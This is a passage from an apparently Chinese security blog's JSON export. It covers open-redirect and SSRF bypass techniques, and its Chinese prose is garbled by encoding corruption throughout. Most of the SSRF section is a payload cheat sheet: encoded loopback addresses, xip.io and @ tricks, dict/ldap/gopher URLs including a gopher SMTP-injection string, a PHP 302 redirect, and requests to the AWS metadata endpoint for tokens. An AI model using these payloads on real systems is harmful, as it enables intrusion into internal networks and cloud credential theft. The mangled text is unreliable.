å½“ç„¶ï¼Œè¿™ä¸ªå½±å“å°±å¾ˆå°äº†ï¼Œæ¯”å¦‚å½“ä½ å¡«ä»€ä¹ˆè¡¨æ ¼æˆ–è€…éœ€è¦å¡«å†™ä»€ä¹ˆçš„ï¼Œå½“ä½ ä¸Šä¼ å›¾ç‰‡ï¼Œç‚¹å‡»ä¸‹ä¸€æ­¥çš„æ—¶å€™ï¼Œé€šå¸¸ä¸‹ä¸€æ­¥å°±æ˜¯é¢„è§ˆä½ å¡«å†™çš„ä¿¡æ¯ï¼Œæœ€åæ‰æ˜¯æäº¤ã€‚å½“ä½ ä¸Šä¼ äº†å›¾ç‰‡åç‚¹å‡»ä¸‹ä¸€æ­¥æŠ“åŒ…ï¼Œå¦‚æœè¿‡æ»¤ä¸ä¸¥ï¼Œä½ ä¼šçœ‹åˆ°å›¾ç‰‡çš„å®Œæ•´åœ°å€åŒ…å«åœ¨POSTå‚æ•°é‡Œï¼Œä½ å°±å¯ä»¥ç›´æ¥ä¿®æ”¹è¿™ä¸ªåœ°å€ä¸ºä»»æ„URLï¼Œç„¶ååˆ°è¾¾ä¸‹ä¸€æ­¥ã€‚è¿™æ—¶æ˜¯ç¡®å®šä¿¡æ¯ä¹Ÿå°±æ˜¯é¢„è§ˆè‡ªå·±å¡«å†™çš„ä¿¡æ¯çš„æ­£ç¡®è¿˜æ˜¯ä¸æ­£ç¡®ï¼Œç”±äºä½ åˆšåˆšä¿®æ”¹äº†å›¾ç‰‡åœ°å€ï¼Œè¿™é‡Œæ˜¯æ²¡æœ‰æ˜¾ç¤ºå‡ºæ¥çš„ï¼Œå›¾åƒä¼šæ˜¯ä¸€ä¸ªå°XXã€‚å½“ç‚¹å‡»å›¾ç‰‡å³é”®é€‰æ‹©æŸ¥çœ‹å›¾åƒæ—¶ï¼Œå°±ä¼šè§¦å‘URLè·³è½¬é—®é¢˜ï¼Œå…¶å®è¿™ä¸ªä¹Ÿå¯ä»¥åˆ©ç”¨æ¥è¿›è¡Œé’“é±¼ï¼Œé’“åå°å®¡æ ¸å‘˜çš„ä¿¡æ¯ã€‚ä¸ºä»€ä¹ˆå‘¢ï¼Œæ¯”å¦‚å®¡æ ¸çœ‹åˆ°å›¾ç‰‡æ— æ³•åŠ è½½ï¼Œä¸€èˆ¬éƒ½ä¼šç‚¹å‡»æŸ¥çœ‹å›¾ç‰‡ï¼Œç„¶åè·³è½¬ï¼Œå¦‚æœå®‰å…¨æ„è¯†ä¸çŸ¥å°±ä¼šé€ æˆå®‰å…¨å½±å“ã€‚å½“ç„¶ï¼Œå¦‚æœPOSTå‚æ•°é‡Œå°±åªæ˜¯URLè·³è½¬å‚æ•°ï¼Œé‚£ä¹ˆä½ å¯ä»¥ç»™å®ƒè½¬æˆGETæ–¹å¼ï¼Œç„¶åè¿›è¡Œè·³è½¬å°±å¯ä»¥äº†ï¼Œåªè¦ç½‘ç«™æ”¯æŒè¿™æ ·çš„GETæ–¹å¼å°±è¡Œã€‚åœ¨Burp Suiteé‡Œå¯ä»¥ä¸€é”®è½¬æ¢æäº¤æ–¹å¼ï¼Œå³é”®é€‰æ‹©Change request methodå°±å¯ä»¥ï¼ 0x10 åˆ©ç”¨#å·ç»•è¿‡ å¦‚ï¼šhttp://www.aaa.com/acb?Url=http://test.com#login.aaa.com 0x09 FUZZ é‡å®šå‘Payloads by @cujanovichttps://github.com/cujanovic/Open-Redirect-Payloads é‡å®šå‘å‚æ•° by @fuzzdb-projecthttps://github.com/fuzzdb-project/fuzzdb/blob/master/attack/redirect/redirect-urls-template.txt","categories":[{"name":"WEBå®‰å…¨","slug":"WEBå®‰å…¨","permalink":"http://www.vkxss.top/categories/WEBå®‰å…¨/"}],"tags":[{"name":"WEBæ¸—é€æµ‹è¯•","slug":"WEBæ¸—é€æµ‹è¯•","permalink":"http://www.vkxss.top/tags/WEBæ¸—é€æµ‹è¯•/"}]},{"title":"SSRFç»•è¿‡çš„æ–¹æ³•","slug":"æ¸—é€æµ‹è¯•-SSRFç»•è¿‡çš„æ–¹æ³•","date":"2019-07-19T06:25:40.000Z","updated":"2019-10-17T14:57:40.371Z","comments":true,"path":"2019/07/19/æ¸—é€æµ‹è¯•-SSRFç»•è¿‡çš„æ–¹æ³•/","link":"","permalink":"http://www.vkxss.top/2019/07/19/æ¸—é€æµ‹è¯•-SSRFç»•è¿‡çš„æ–¹æ³•/","excerpt":"","text":"1ã€SSRF 1.1ã€æè¿°ï¼š 1.2ã€æ¼æ´å¯»æ‰¾ï¼š 1.3 æ¼æ´éªŒè¯ 1.4 åˆ©ç”¨æ–¹å¼ 1.5ã€æ¼æ´åˆ©ç”¨ç¤ºä¾‹ï¼š 1.6ã€Bypass 1.7 SSRFå±å®³ 1.8 æ¼æ´ä¿®å¤ 1.9 å‚è€ƒæ–‡ç«  1ã€SSRF1.1ã€æè¿°ï¼š SSRF(Server-Side Request Forgery)æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ å½¢æˆç”±æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚çš„ä¸€ä¸ªæ¼æ´ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRF æ”»å‡»çš„ç›®æ ‡æ˜¯ä»å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚ 1.2ã€æ¼æ´å¯»æ‰¾ï¼š åˆ†äº«åŠŸèƒ½ï¼Œé€šè¿‡ URL åœ°å€åˆ†äº«ç½‘é¡µå†…å®¹ æ—©æœŸåˆ†äº«åº”ç”¨ä¸­ï¼Œä¸ºäº†æ›´å¥½çš„æä¾›ç”¨æˆ·ä½“éªŒï¼ŒWEBåº”ç”¨åœ¨åˆ†äº«åŠŸèƒ½ä¸­ï¼Œé€šå¸¸ä¼šè·å–ç›®æ ‡URLåœ°å€ç½‘é¡µå†…å®¹ä¸­çš„æ ‡ç­¾æˆ–è€…æ ‡ç­¾ä¸­contentçš„æ–‡æœ¬å†…å®¹ä½œä¸ºæ˜¾ç¤ºä»¥æä¾›æ›´å¥½çš„ç”¨æˆ·ä½“éªŒ è½¬ç æœåŠ¡ï¼šé€šè¿‡URLåœ°å€æŠŠåŸåœ°å€çš„ç½‘é¡µå†…å®¹è°ƒä¼˜ä½¿å…¶é€‚åˆæ‰‹æœºå±å¹•æµè§ˆ ç”±äºæ‰‹æœºå±å¹•å¤§å°çš„å…³ç³»ï¼Œç›´æ¥æµè§ˆç½‘é¡µå†…å®¹çš„æ—¶å€™ä¼šé€ æˆè®¸å¤šä¸ä¾¿ï¼Œå› æ­¤æœ‰äº›å…¬å¸æä¾›äº†è½¬ç åŠŸèƒ½ï¼ŒæŠŠç½‘é¡µå†…å®¹é€šè¿‡ç›¸å…³æ‰‹æ®µè½¬ä¸ºé€‚åˆæ‰‹æœºå±å¹•æµè§ˆçš„æ ·å¼ã€‚ä¾‹å¦‚ç™¾åº¦ã€è…¾è®¯ã€æœç‹—ç­‰å…¬å¸éƒ½æœ‰æä¾›åœ¨çº¿è½¬ç æœåŠ¡ åœ¨çº¿ç¿»è¯‘ï¼šé€šè¿‡URLåœ°å€ç¿»è¯‘å¯¹åº”æ–‡æœ¬çš„å†…å®¹ã€‚ æä¾›æ­¤åŠŸèƒ½çš„å›½å†…å…¬å¸æœ‰ç™¾åº¦ã€æœ‰é“ç­‰ å›¾ç‰‡åŠ è½½ä¸ä¸‹è½½ï¼šé€šè¿‡URLåœ°å€åŠ è½½æˆ–ä¸‹è½½å›¾ç‰‡ å›¾ç‰‡åŠ è½½è¿œç¨‹å›¾ç‰‡åœ°å€æ­¤åŠŸèƒ½ç”¨åˆ°çš„åœ°æ–¹å¾ˆå¤šï¼Œä½†å¤§å¤šéƒ½æ˜¯æ¯”è¾ƒéšç§˜ï¼Œæ¯”å¦‚åœ¨æœ‰äº›å…¬å¸ä¸­çš„åŠ è½½è‡ªå®¶å›¾ç‰‡æœåŠ¡å™¨ä¸Šçš„å›¾ç‰‡ç”¨äºå±•ç¤ºã€‚ï¼ˆå¼€å‘è€…ä¸ºäº†æœ‰æ›´å¥½çš„ç”¨æˆ·ä½“éªŒé€šå¸¸å¯¹å›¾ç‰‡åšäº›å¾®å°è°ƒæ•´ä¾‹å¦‚åŠ æ°´å°ã€å‹ç¼©ç­‰ï¼Œæ‰€ä»¥å°±å¯èƒ½é€ æˆSSRFé—®é¢˜ï¼‰ å›¾ç‰‡ã€æ–‡ç« æ”¶è—åŠŸèƒ½ æ­¤å¤„çš„å›¾ç‰‡ã€æ–‡ç« æ”¶è—ä¸­çš„æ–‡ç« æ”¶è—å°±ç±»ä¼¼äºåŠŸèƒ½ä¸€ã€åˆ†äº«åŠŸèƒ½ä¸­è·å–URLåœ°å€ä¸­titleä»¥åŠæ–‡æœ¬çš„å†…å®¹ä½œä¸ºæ˜¾ç¤ºï¼Œç›®çš„è¿˜æ˜¯ä¸ºäº†æ›´å¥½çš„ç”¨æˆ·ä½“éªŒï¼Œè€Œå›¾ç‰‡æ”¶è—å°±ç±»ä¼¼äºåŠŸèƒ½å››ã€å›¾ç‰‡åŠ è½½ æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–è°ƒç”¨URLçš„åŠŸèƒ½ æ­¤å¤„ç±»ä¼¼çš„åŠŸèƒ½æœ‰360æä¾›çš„ç½‘ç«™è¯„åˆ†ï¼Œä»¥åŠæœ‰äº›ç½‘ç«™é€šè¿‡apiè·å–è¿œç¨‹åœ°å€xmlæ–‡ä»¶æ¥åŠ è½½å†…å®¹ã€‚ æ•°æ®åº“å†…ç½®åŠŸèƒ½ï¼šæ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•° é‚®ä»¶ç³»ç»Ÿï¼šæ¯”å¦‚æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€ ç¼–ç å¤„ç†, å±æ€§ä¿¡æ¯å¤„ç†ï¼Œæ–‡ä»¶å¤„ç†ï¼šæ¯”å¦‚ffpmgï¼ŒImageMagickï¼Œdocxï¼Œpdfï¼Œxmlå¤„ç†å™¨ç­‰ æœªå…¬å¼€çš„apiå®ç°ä»¥åŠå…¶ä»–æ‰©å±•è°ƒç”¨URLçš„åŠŸèƒ½ï¼šå¯ä»¥åˆ©ç”¨google è¯­æ³•åŠ ä¸Šè¿™äº›å…³é”®å­—å»å¯»æ‰¾SSRFæ¼æ´ ä¸€äº›çš„urlä¸­çš„å…³é”®å­—ï¼šshareã€wapã€urlã€linkã€srcã€sourceã€targetã€uã€3gã€displayã€sourceURlã€imageURLã€domainâ€¦â€¦ ä»è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚èµ„æºï¼ˆupload from url å¦‚discuzï¼ï¼›import &amp; expost rss feed å¦‚web blogï¼›ä½¿ç”¨äº†xmlå¼•æ“å¯¹è±¡çš„åœ°æ–¹ å¦‚wordpress xmlrpc.phpï¼‰ webé’©å­ï¼šå¯»æ‰¾è§¦å‘ç‰¹å®šäº‹ä»¶æ—¶å‘å‡ºhttpè¯·æ±‚çš„æœåŠ¡ã€‚åœ¨å¤§å¤šæ•°webé’©å­çš„åŠŸèƒ½ä¸­ï¼Œç»ˆç«¯ç”¨æˆ·å¯ä»¥é€‰æ‹©ä»–ä»¬çš„ç»ˆç«¯ç‚¹å’Œä¸»æœºåã€‚å°è¯•å‘å†…éƒ¨æœåŠ¡å‘é€httpè¯·æ±‚ã€‚ æ–‡æ¡£è§£æå™¨ï¼šå°è¯•äº†è§£æ–‡æ¡£æ˜¯å¦‚ä½•è¢«è§£æçš„ã€‚å¦‚æœæ˜¯XMLæ–‡æ¡£ï¼Œé‚£å°±æ˜¯ç”¨äº†PDFç”Ÿæˆå™¨æ–¹æ³•ã€‚å¯¹äºå…¶ä»–æ–‡æ¡£ï¼Œæ£€æŸ¥æ˜¯å¦å­˜åœ¨å¼•ç”¨å¤–éƒ¨èµ„æºçš„æ–¹æ³•ç„¶åé€šè¿‡æœåŠ¡å™¨å‘å†…éƒ¨æœåŠ¡å‘é€è¯·æ±‚ã€‚ é“¾æ¥æ‰©å±•: æœ€è¿‘Mark Litchfieldåœ¨æ¨ç‰¹æ‰©å±•é“¾æ¥ä¸Šå‘ç°äº†æ¼æ´ï¼Œåå£°å¤§æ¶¨ã€‚ æ–‡ä»¶ä¸Šä¼ ï¼šä¸å¸¸è§„ä¸Šä¼ æ–‡ä»¶ç›¸åï¼Œå°è¯•å‘é€urlè¯·æ±‚ç„¶åæ£€æŸ¥æ˜¯å¦ä¸‹è½½äº†urlçš„å†…å®¹ã€‚ä¾‹å­ PDFç”Ÿæˆå™¨ï¼šè¯•ç€æ³¨å…¥æŒ‡å‘å†…éƒ¨æœåŠ¡çš„&lt;iframe&gt;&lt;img&gt;,&lt;base&gt;æˆ–è€…&lt;script&gt;å…ƒç´ æˆ–è€…CSSçš„url()å‡½æ•°ã€‚ 1.3 æ¼æ´éªŒè¯ æ’é™¤æ³•ï¼šæµè§ˆå™¨f12æŸ¥çœ‹æºä»£ç çœ‹æ˜¯å¦æ˜¯åœ¨æœ¬åœ°è¿›è¡Œäº†è¯·æ±‚ 1æ¯”å¦‚ï¼šè¯¥èµ„æºåœ°å€ç±»å‹ä¸º http://www.xxx.com/a.php?image=ï¼ˆåœ°å€ï¼‰çš„å°±å¯èƒ½å­˜åœ¨SSRFæ¼æ´ dnslogç­‰å·¥å…·è¿›è¡Œæµ‹è¯•ï¼Œçœ‹æ˜¯å¦è¢«è®¿é—® 1å¯ä»¥åœ¨ç›²æ‰“åå°ç”¨ä¾‹ä¸­å°†å½“å‰å‡†å¤‡è¯·æ±‚çš„uri å’Œå‚æ•°ç¼–ç æˆbase64ï¼Œè¿™æ ·ç›²æ‰“åå°è§£ç åå°±çŸ¥é“æ˜¯å“ªå°æœºå™¨å“ªä¸ªcgiè§¦å‘çš„è¯·æ±‚ã€‚ æŠ“åŒ…åˆ†æå‘é€çš„è¯·æ±‚æ˜¯ä¸æ˜¯ç”±æœåŠ¡å™¨çš„å‘é€çš„ï¼Œå¦‚æœä¸æ˜¯å®¢æˆ·ç«¯å‘å‡ºçš„è¯·æ±‚ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯ï¼Œæ¥ç€æ‰¾å­˜åœ¨HTTPæœåŠ¡çš„å†…ç½‘åœ°å€ 12ä»æ¼æ´å¹³å°ä¸­çš„å†å²æ¼æ´å¯»æ‰¾æ³„æ¼çš„å­˜åœ¨webåº”ç”¨å†…ç½‘åœ°å€é€šè¿‡äºŒçº§åŸŸåæš´åŠ›çŒœè§£å·¥å…·æ¨¡ç³ŠçŒœæµ‹å†…ç½‘åœ°å€ ç›´æ¥è¿”å›çš„Bannerã€titleã€contentç­‰ä¿¡æ¯ ç•™æ„boolå‹SSRF 1.4 åˆ©ç”¨æ–¹å¼ è®©æœåŠ¡ç«¯å»è®¿é—®ç›¸åº”çš„ç½‘å€ è®©æœåŠ¡ç«¯å»è®¿é—®è‡ªå·±æ‰€å¤„å†…ç½‘çš„ä¸€äº›æŒ‡çº¹æ–‡ä»¶æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨ç›¸åº”çš„cms å¯ä»¥ä½¿ç”¨fileã€dictã€gopher[11]ã€ftpåè®®è¿›è¡Œè¯·æ±‚è®¿é—®ç›¸åº”çš„æ–‡ä»¶ æ”»å‡»å†…ç½‘webåº”ç”¨ï¼ˆå¯ä»¥å‘å†…éƒ¨ä»»æ„ä¸»æœºçš„ä»»æ„ç«¯å£å‘é€ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…{payload}ï¼‰ æ”»å‡»å†…ç½‘åº”ç”¨ç¨‹åºï¼ˆåˆ©ç”¨è·¨åè®®é€šä¿¡æŠ€æœ¯ï¼‰ åˆ¤æ–­å†…ç½‘ä¸»æœºæ˜¯å¦å­˜æ´»ï¼šæ–¹æ³•æ˜¯è®¿é—®çœ‹æ˜¯å¦æœ‰ç«¯å£å¼€æ”¾ â€‹- æŸäº›æ—¶å€™SSRFæ¼æ´å¯ä»¥ç”¨ä½œå±€åŸŸç½‘å†…çš„ç«¯å£æ‰«æã€‚è¿™æœ‰åŠ©äºç†æ¸…å†…ç½‘çš„åŸºç¡€è®¾æ–½è½®å»“å’Œå¹¶ä¸ºä¸‹ä¸€æ­¥å…¶ä»–æ¼æ´çš„åˆ©ç”¨åšé“ºå«ã€‚ä¸Šè¿°è¿™ç§æƒ…å†µé€šå¸¸æ˜¯æœ€ç®€å•çš„blind SSRFäº†ã€‚å¦‚æœä¹‹å‰çš„è„šæœ¬æ— æ³•å»ºç«‹è¿æ¥æˆ–æ”¶ä¸åˆ°æœåŠ¡å™¨å“åº”ï¼Œå¼‚å¸¸å°†è¢«æŠ›å‡ºã€‚åˆ©ç”¨è¿™ä¸ªç‰¹å¾å¯ä»¥è¯†åˆ«ç«¯å£æ˜¯å¦å¼€æ”¾ï¼ˆè¿æ¥å»ºç«‹ï¼‰æˆ–å…³é—­ï¼ˆè¿æ¥å¤±è´¥æˆ–è¶…æ—¶ï¼‰ã€‚ 12345URL parameter Response HTTP status RTT Conclusionhttp://127.0.0.1:22 200 10ms Port is openhttp://127.0.0.1:23 500 10ms Port is closedhttp://10.0.0.1/ 500 30010ms Firewalled or unable to route traffic to serverhttp://10.0.0.1:8080/ 500 10ms Port is closed and traffic is routed to server å¯¹äºå¼€æ”¾å’Œå…³é—­çš„ç«¯å£ï¼Œæ¯ä¸ªSSRFå“åº”éƒ½ä¸åŒã€‚è¯•ç€ä»¥ä¸åŒçš„å“åº”ä¸ºåŸºç¡€å»ºç«‹ä¸€ä¸ªå¼€æ”¾ã€é—­åˆç«¯å£å’Œæ ‡å¿—ç¬¦ä¹‹é—´çš„æ˜ å°„ã€‚ä¸Šé¢çš„è¡¨æ ¼å°±æ˜¯ä¸€ä¸ªä¾‹å­ã€‚ DoSæ”»å‡»ï¼ˆè¯·æ±‚å¤§æ–‡ä»¶ï¼Œå§‹ç»ˆä¿æŒè¿æ¥keep-alive alwaysï¼‰ æå–EC2é…ç½®æ–‡ä»¶ è¶Šæ¥è¶Šå¤šçš„å…¬å¸å°†éƒ¨åˆ†åŸºç¡€è®¾æ–½æ”¾åˆ°äºšé©¬é€Šçš„EC2æœåŠ¡å™¨ä¸Šã€‚äºšé©¬é€Šå…¬å¼€å†…éƒ¨æœåŠ¡ï¼Œæ¯å°ECå®ä¾‹éƒ½èƒ½æŸ¥è¯¢ä¸»æœºå…ƒæ•°æ®ã€‚è¿™æ˜¯AWSæ–‡æ¡£ã€‚å¦‚æœä½ åœ¨EC2ä¸Šå‘ç°äº†SSRFæ¼æ´ï¼Œè¯•ç€è¯·æ±‚http://169.254.169.254/latest/meta-dataã€‚å“åº”ä¼šæä¾›è®¸å¤šæœ‰ç”¨çš„ä¿¡æ¯ä¾¿äºå¯¹åŸºç¡€è®¾æ–½æœ‰ä¸€å®šçš„äº†è§£ï¼Œç”šè‡³å¯èƒ½ä¼šæ³„æ¼äºšé©¬é€ŠS3çš„è®¿é—®tokenï¼ŒAPI tokenç­‰ç­‰ã€‚ä½ ä¹Ÿå¯ä»¥ä¸‹è½½_ http://169.254.169.254/latest/user-data_å’Œè§£å‹æ•°æ®ã€‚ 1.5ã€æ¼æ´åˆ©ç”¨ç¤ºä¾‹ï¼š æŸåº¦ç¿»è¯‘SSRFï¼š æŸçŸ­ç½‘å€SSRFï¼š 1.6ã€Bypass 1.4.1 æ”»å‡»æœ¬åœ° 12http://127.0.0.1:80http://localhost:22 1.4.2åˆ©ç”¨[::] 123åˆ©ç”¨[::]ç»•è¿‡localhosthttp://[::]:80/ &gt;&gt;&gt; http://127.0.0.1ä¹Ÿæœ‰çœ‹åˆ°åˆ©ç”¨http://0000::1:80/çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æœªæˆåŠŸ 1.4.3åˆ©ç”¨@ 123http://example.com@127.0.0.1http://A.com:B@127.0.0.1127.0.0.1#http://abc 1.4.4åˆ©ç”¨çŸ­åœ°å€ 1234ï¼ˆ1ï¼‰ç™¾åº¦çŸ­ç½‘å€è½¬æ¢ï¼šhttps://dwz.cn #ä¸æ”¯æŒip http://dwz.cn/11SMa &gt;&gt;&gt; http://127.0.0.1 ï¼ˆ2ï¼‰TinyURLï¼šhttps://tinyurl.com/create.php #æ”¯æŒip 1.4.5åˆ©ç”¨ç‰¹æ®ŠåŸŸå 12345678910111213åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æhttp://127.0.0.1.xip.io/http://www.owasp.org.127.0.0.1.xip.io/http://mysite.127.0.0.1.xip.iohttp://foo.bar.127.0.0.1.xip.io#åˆ©ç”¨ssrf.php?url=http://127.0.0.1.xip.io/orssrf.php?url=http://www.127.0.0.1.xip.io/orssrf.php?url=http://evi1.cn.127.0.0.1.xip.io/orssrf.php?url=dict://evi1.cn.127.0.0.1.xip.io:22/info 1.4.6 åˆ©ç”¨DNSè§£æ 1åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1 1.4.7 åˆ©ç”¨ä¸Šä¼  1234ä¹Ÿä¸ä¸€å®šæ˜¯ä¸Šä¼ ï¼Œæˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œè‡ªå·±ä½“ä¼š -.-ä¿®æ”¹&quot;type=file&quot;ä¸º&quot;type=url&quot;æ¯”å¦‚ï¼šä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF ä¾‹å­ 1.4.8 åˆ©ç”¨Enclosed alphanumerics 1234567891011åˆ©ç”¨Enclosed alphanumericshttp://â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ &gt;&gt;&gt; http://example.comList:â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿ 1.4.9 åˆ©ç”¨å¥å· 1http://127ã€‚0ã€‚0ã€‚1 &gt;&gt;&gt; http://127.0.0.1 1.4.10 åˆ©ç”¨è¿›åˆ¶è½¬æ¢ â€“ IPè¿›åˆ¶è½¬æ¢åœ°å€ï¼šè½¬æ¢åœ°å€ 12345678910111213141516171819å¯ä»¥æ˜¯åå…­è¿›åˆ¶ï¼Œå…«è¿›åˆ¶ç­‰ã€‚115.239.210.26 &gt;&gt;&gt; 16373751032é¦–å…ˆæŠŠè¿™å››æ®µæ•°å­—ç»™åˆ†åˆ«è½¬æˆ16è¿›åˆ¶ï¼Œç»“æœï¼š73 ef d2 1aç„¶åæŠŠ 73efd21a è¿™åå…­è¿›åˆ¶ä¸€èµ·è½¬æ¢æˆ8è¿›åˆ¶è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶(å¯ä»¥æ˜¯ä¸€ä¸ª0ä¹Ÿå¯ä»¥æ˜¯å¤šä¸ª0 è·ŸXSSä¸­å¤šåŠ å‡ ä¸ª0æ¥ç»•è¿‡è¿‡æ»¤ä¸€æ ·)ï¼Œåå…­è¿›åˆ¶åŠ 0xIPè½¬æ¢ä¸º-16è¿›åˆ¶-è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0Xè¡¨ç¤ºä½¿ç”¨16è¿›åˆ¶http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://0X7F000001IPè½¬æ¢ä¸º-16è¿›åˆ¶-è½¬æ¢ä¸ºå…«è¿›åˆ¶-è®°å¾—è®¿é—®çš„æ—¶å€™åŠ 0è¡¨ç¤ºä½¿ç”¨å…«è¿›åˆ¶http://127.0.01 &gt;&gt;&gt; http://7F000001 &gt;&gt;&gt;http://17700000001&gt;&gt;&gt;http://017700000001127è½¬æ¢ä¸º8è¿›åˆ¶ï¼šhttp://127.0.0.1 &gt;&gt;&gt; http://0177.0.0.1/ipåœ°å€è½¬æ¢ä¸º10è¿›åˆ¶ï¼šhttp://127.0.0.1 &gt;&gt;&gt; http://2130706433/http://192.168.0.1 &gt;&gt;&gt; http://3232235521/http://192.168.1.1 &gt;&gt;&gt; http://3232235777/ 12345678910111213#ip:127.0.0.1ï¼ˆ1ï¼‰8è¿›åˆ¶æ ¼å¼ï¼š0177.0.0.1ï¼ˆ2ï¼‰16è¿›åˆ¶æ ¼å¼ï¼š0x7F.00.00.01ï¼ˆ3ï¼‰8è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š017700000001ï¼ˆ3ï¼‰10è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š2130706433ï¼ˆ4ï¼‰16è¿›åˆ¶æ•´æ•°æ ¼å¼ï¼š0x7f000001#è½¬æ¢æ–¹æ³•8è¿›åˆ¶å‰åŠ 0ï¼Œ16è¿›åˆ¶å‰åŠ 0xå°†ipçš„æ¯ä¸€ä½ç”±åè¿›åˆ¶è½¬æ¢ä¸ºäºŒè¿›åˆ¶ï¼Œå†å°†äºŒè¿›åˆ¶è½¬æ¢ä¸ºå…«è¿›åˆ¶æˆ–åå…­è¿›åˆ¶å…³äºæ•´æ•°æ ¼å¼ï¼šipv4æ˜¯32ä½äºŒè¿›åˆ¶æ•°ï¼Œå°†å…¶è½¬æ¢ä¸º32ä½äºŒè¿›åˆ¶æ•°ï¼Œå†å°†å…¶è½¬æ¢ä¸ºåè¿›åˆ¶æˆ–åå…­è¿›åˆ¶ 1.4.11 åˆ©ç”¨ç‰¹æ®Šåœ°å€ 1http://0/ 1.4.12 åˆ©ç”¨åè®® 1234567891011Dict://dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;ssrf.php?url=dict://attacker:11111/SFTP://ssrf.php?url=sftp://example.com:11111/TFTP://ssrf.php?url=tftp://example.com:12346/TESTUDPPACKETLDAP://ssrf.php?url=ldap://localhost:11211/%0astats%0aquitGopher://ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a 1.4.13 åˆ©ç”¨301æˆ–è€…302è·³è½¬ 123http://www.th1s.cn/test/ssrf.phpssrf.phpé‡Œé¢çš„å†…å®¹ä¸ºï¼š&lt;?php header(&apos;Location:10.1.1.1&apos;);?&gt; 1.4.14 ä½¿ç”¨ç»„åˆ å„ç§ç»•è¿‡è¿›è¡Œè‡ªç”±ç»„åˆå³å¯ å‚è€ƒé“¾æ¥ï¼š 12345678910https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRFhttps://twitter.com/albinowax/status/890725759861403648http://blog.safebuff.com/2016/07/03/SSRF-Tips/https://hackerone.com/reports/115748https://www.dailysecurity.fr/server-side-request-forgery/https://twitter.com/EdOverflowhttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injectionhttp://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdfhttp://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/http://blog.csdn.net/xinianbuxiu/article/details/53560417 1.7 SSRFå±å®³ ä¸»æœºæœ¬åœ°æ•æ„Ÿä¿¡æ¯è¯»å–ï¼Œ å¯¹å¤–ç½‘ã€æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„Bannerä¿¡æ¯ã€‚ æ”»å‡»è¿è¡Œåœ¨å†…å¤–ç½‘ä¸»æœºçš„åº”ç”¨ç¨‹åºã€‚ é€šè¿‡è®¿é—®é»˜è®¤æ–‡ä»¶å¯¹å†…ç½‘ Web åº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ã€‚ æ”»å‡»å†…å¤–ç½‘çš„ Web 